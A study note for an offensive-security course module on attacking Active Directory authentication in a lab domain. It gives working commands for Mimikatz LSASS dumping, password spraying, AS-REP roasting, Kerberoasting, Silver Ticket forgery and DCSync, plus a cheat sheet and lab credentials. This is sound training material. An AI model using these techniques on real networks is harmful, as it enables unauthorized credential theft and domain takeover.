---
title: "PWK Module 22 — Attacking Active Directory Authentication"
created: "2026-04-05"
type: reference-note
status: active
tags:
  - reference-note
  - active-directory
  - kerberos
  - kerberoasting
  - as-rep-roasting
  - silver-ticket
  - dcsync
  - mimikatz
  - oscp
source: "PWK Module 22 — Attacking Active Directory Authentication"
---

# PWK Module 22 — Attacking Active Directory Authentication

## Overview

This module covers six AD authentication attack techniques: credential dumping from LSASS, password spraying, AS-REP Roasting, Kerberoasting, Silver Ticket forgery, and DCSync. The goal is obtaining domain credentials — hashes or plaintext — that enable lateral movement and privilege escalation.

**Lab context:** Domain `corp.com`, DC at `192.168.50.70`, workstation `CLIENT75`, attacker is `jeff` (local admin on CLIENT75).

---

## 1. Cached Credential Dumping with Mimikatz

Mimikatz extracts credentials stored in LSASS memory — the first action on any newly-compromised Windows machine.

**Requirements:** Local Administrator + SeDebugPrivilege

```cmd
# Launch Mimikatz as Administrator
cd C:\Tools
.\mimikatz.exe

# Enable SeDebugPrivilege (required to access LSASS)
privilege::debug

# Dump all credentials cached in LSASS
sekurlsa::logonpasswords
```

**What you get:**
- **NTLM hashes** for all logged-on users (always present)
- **SHA-1 hashes** for newer AD functional levels (Windows Server 2008+)
- **Cleartext passwords** if WDigest is enabled (older systems, Windows 7 or manually enabled)

**Dump Kerberos tickets from LSASS:**

```
sekurlsa::tickets
```

Shows TGTs and TGS tickets cached in memory. A stolen TGT lets you request TGS for any service that user can access. A stolen TGS gives access to that specific service.

**Export tickets to disk / inject tickets:**

```
sekurlsa::tickets /export      # export all tickets as .kirbi files
kerberos::ptt ticket.kirbi     # inject a .kirbi ticket into current session
```

---

## 2. Password Spraying — Account Lockout Awareness

**Always check the domain account policy first:**

```cmd
net accounts
```

Key fields:
- **Lockout threshold:** Max failed attempts before lockout (e.g., 5)
- **Lockout observation window:** Minutes before counter resets (e.g., 30 min)

**Safe spray calculation:**
```
Safe attempts per window = threshold - 1 (e.g., 4 per 30 min)
Per 24 hours = (1440 min / 30 min) × 4 = 192 attempts per user
```

### Method 1: LDAP Spray (Spray-Passwords.ps1)

Low and slow. Uses DirectoryEntry authentication attempt — if creds are wrong, throws an exception.

```powershell
.\Spray-Passwords.ps1 -Pass Flowers1              # single password against all users
.\Spray-Passwords.ps1 -File passwords.txt         # wordlist
.\Spray-Passwords.ps1 -Pass Flowers1 -Admin       # include admin accounts
```

### Method 2: SMB Spray (crackmapexec)

Noisy — creates full SMB connections. Also reveals if user has local admin (`Pwn3d!`).

```bash
# On Kali
crackmapexec smb 192.168.50.75 -u usernames.txt -p Flowers1 -d corp.com --continue-on-success
# + = valid creds, - = invalid
# Pwn3d! = user has local admin on that machine
```

**Caveat:** crackmapexec does not check lockout policy — be careful with attempt count.

### Method 3: Kerberos TGT Spray (kerbrute)

Fastest and quietest — only 2 UDP frames per attempt (AS-REQ → AS-REP). No SMB connection.

```bash
kerbrute passwordspray -d corp.com usernames.txt Flowers1
# Cross-platform: works on Kali and Windows
```

---

## 3. AS-REP Roasting

**Target:** Accounts with "Do not require Kerberos preauthentication" enabled. These send back an AS-REP encrypted with their NTLM hash — no valid credentials required to request it.

**Find vulnerable accounts from enumeration:**
```powershell
Get-NetUser | select cn,useraccountcontrol
# Look for: DONT_REQ_PREAUTH flag
```

### From Kali (impacket)

```bash
impacket-GetNPUsers -dc-ip 192.168.50.70 -outputfile hashes.asreproast -request corp.com/pete:Flowers1
# Outputs hash in Hashcat-compatible format
# dave → vulnerable (DONT_REQ_PREAUTH enabled)
```

### From Windows (Rubeus)

```cmd
.\Rubeus.exe asreproast
# Auto-identifies all vulnerable accounts, no extra params needed
# Copy hash → remove all line breaks → add $23 separator
```

**Crack with Hashcat (mode 18200):**

```bash
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
# Result: dave:Flowers1
```

**Why it works:** Without preauthentication, the KDC will respond to ANY AS-REQ with an encrypted TGT. The encryption uses the account's NTLM hash as key → offline crack.

---

## 4. Kerberoasting

**Target:** Domain accounts with SPNs (service accounts). Any authenticated domain user can request a TGS for any SPN — the TGS is encrypted with the service account's NTLM hash → offline crack.

**Find SPN accounts (from Module 21):**
```powershell
Get-NetUser -SPN | select samaccountname,serviceprincipalname
# Target: iis_service → HTTP/web04.corp.com
```

### From Windows (Rubeus)

```cmd
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Identifies all SPN accounts, requests TGS, writes hashes
```

### From Linux (impacket)

```bash
impacket-GetUserSPNs -dc-ip 192.168.50.70 -request corp.com/pete:Flowers1
# Must provide valid domain creds (Kali not domain-joined)
# Copy hash → save to hashes.kerberoast2
```

**Crack with Hashcat (mode 13100):**

```bash
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
# Result: iis_service:MYpassword123#
```

**Defense note:** Group Managed Service Accounts (gMSA) have 120-character random passwords → effectively impossible to crack. Regular service accounts with human-set passwords are vulnerable.

---

## 5. Silver Ticket Attack

**Concept:** If you have the NTLM hash of a service account, you can forge a service ticket (TGS) for ANY user with ANY permissions — no KDC involvement needed.

**What you need:**
1. NTLM hash of the SPN account (service account's password hash)
2. Domain SID (not including the user RID)
3. Target SPN string

### Step 1 — Get SPN NTLM Hash (Mimikatz)

The service account must have an active session on the machine you're on, or you must be SYSTEM/local admin.

```
privilege::debug
sekurlsa::logonpasswords
# Find iis_service → NTLM: <hash>
```

### Step 2 — Get Domain SID

```cmd
whoami /user
# S-1-5-21-1987370270-658905905-1781884369-1105
# Strip the last number (RID): S-1-5-21-1987370270-658905905-1781884369
```

### Step 3 — Forge the Silver Ticket (Mimikatz)

```
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /target:web04.corp.com /service:http /rc4:<NTLM_HASH> /user:jeffadmin /ptt
```

| Flag | Value |
|------|-------|
| `/sid` | Domain SID (no trailing RID) |
| `/domain` | Domain name |
| `/target` | Hostname where SPN runs |
| `/service` | SPN protocol (http, cifs, mssql, etc.) |
| `/rc4` | NTLM hash of service account |
| `/user` | User to impersonate in ticket (any name) |
| `/ptt` | Inject ticket into current session memory |

**Verify ticket loaded:**
```cmd
klist
# Shows: HTTP/web04.corp.com ticket for jeffadmin
```

**Use the ticket:**
```powershell
iwr -UseDefaultCredentials http://web04.corp.com
# Access granted as jeffadmin!
```

**Key insight:** The `/user:` field can be ANY name you choose — even a non-existent user. You set the group memberships yourself. The service only checks if the ticket's signature is valid (signed with its own NTLM hash), not whether the user actually has those groups.

---

## 6. DCSync Attack

**Concept:** Impersonate a Domain Controller and request credential replication via DRSUAPI (Microsoft Directory Replication Service Remote Protocol). Any account with these AD rights can perform it: `Replicating Directory Changes`, `Replicating Directory Changes All`, `Replicating Directory Changes in Filtered Set`.

**Domain Admins have these rights by default.** Enterprise Admins too. Some custom accounts may be misconfigured with them.

### From Windows (Mimikatz)

Must be run as DA (or account with replication rights):

```
lsadump::dcsync /user:dave
lsadump::dcsync /user:Administrator    # get krbtgt → enables Golden Ticket
lsadump::dcsync /user:krbtgt
# Output: NTLM hash of target user
```

**Crack the hash:**
```bash
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r best64.rule --force
# Mode 1000 = NTLM
```

### From Linux (impacket-secretsdump)

```bash
impacket-secretsdump -just-dc-user dave jeffadmin:BrouhahaTungPerorateBroom2023!@192.168.50.70
# Format: domain/user:password@DC_IP
# Output: NTLM hash of dave (and other formats)
```

**Why this matters:** DCSync gives you hashes for **any** domain user, including krbtgt (needed for Golden Tickets) and Administrator. It's the endgame credential dump — done from a domain controller context without touching LSASS directly.

---

## Attack Decision Tree — Which Technique When?

```
Have local admin on a Windows machine?
├── YES → Mimikatz sekurlsa::logonpasswords (dump hashes + tickets)
│         → Check for WDigest (cleartext on old systems)
└── NO  → Need to escalate first

Have valid domain credentials?
├── YES → Kerberoast (request TGS for SPN accounts)
│         → AS-REP Roast (check for DONT_REQ_PREAUTH accounts)
│         → Password spray (carefully, check lockout policy first)
└── NO  → Password spray (kerbrute, LDAP method first — slower and quieter)

Have NTLM hash of a service account?
└── YES → Silver Ticket (forge TGS for any user, any service it hosts)

Have Domain Admin (or replication rights)?
└── YES → DCSync (dump any user's NTLM hash via replication protocol)
```

---

## Quick Reference — All Commands

```bash
# Mimikatz (Windows)
privilege::debug
sekurlsa::logonpasswords          # dump hashes + cleartext from LSASS
sekurlsa::tickets                 # list cached Kerberos tickets
kerberos::golden /sid:... /domain:... /target:... /service:http /rc4:HASH /user:USER /ptt
lsadump::dcsync /user:dave        # DCSync to get any user's hash

# Password Spraying
net accounts                                                       # check lockout policy
.\Spray-Passwords.ps1 -Pass PASSWORD                               # LDAP spray
crackmapexec smb IP -u users.txt -p PASS -d corp.com --continue-on-success
kerbrute passwordspray -d corp.com users.txt PASS

# AS-REP Roasting
impacket-GetNPUsers -dc-ip IP -outputfile hashes.asreproast -request corp.com/pete:PASS
.\Rubeus.exe asreproast
hashcat -m 18200 hashes.asreproast rockyou.txt -r best64.rule --force

# Kerberoasting
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
impacket-GetUserSPNs -dc-ip IP -request corp.com/pete:PASS
hashcat -m 13100 hashes.kerberoast rockyou.txt -r best64.rule --force

# DCSync
lsadump::dcsync /user:dave
impacket-secretsdump -just-dc-user dave jeffadmin:PASS@DC_IP
hashcat -m 1000 hashes.dcsync rockyou.txt -r best64.rule --force
```

---

## Connections

- [[PWK-Module-21-Active-Directory-Enumeration]] — SPN enumeration for Kerberoasting targets; BloodHound paths
- [[AD-Authentication-Attack-Patterns]] — mental model for choosing the right attack
- [[PWK-Module-16-Password-Attacks]] — hashcat modes and methodology (NTLM=1000, AS-REP=18200, TGS=13100)
- [[PWK-Module-23-Lateral-Movement-AD]] — using hashes from DCSync for Pass-the-Hash; using tickets for Pass-the-Ticket

---

*From: PWK Module 22*
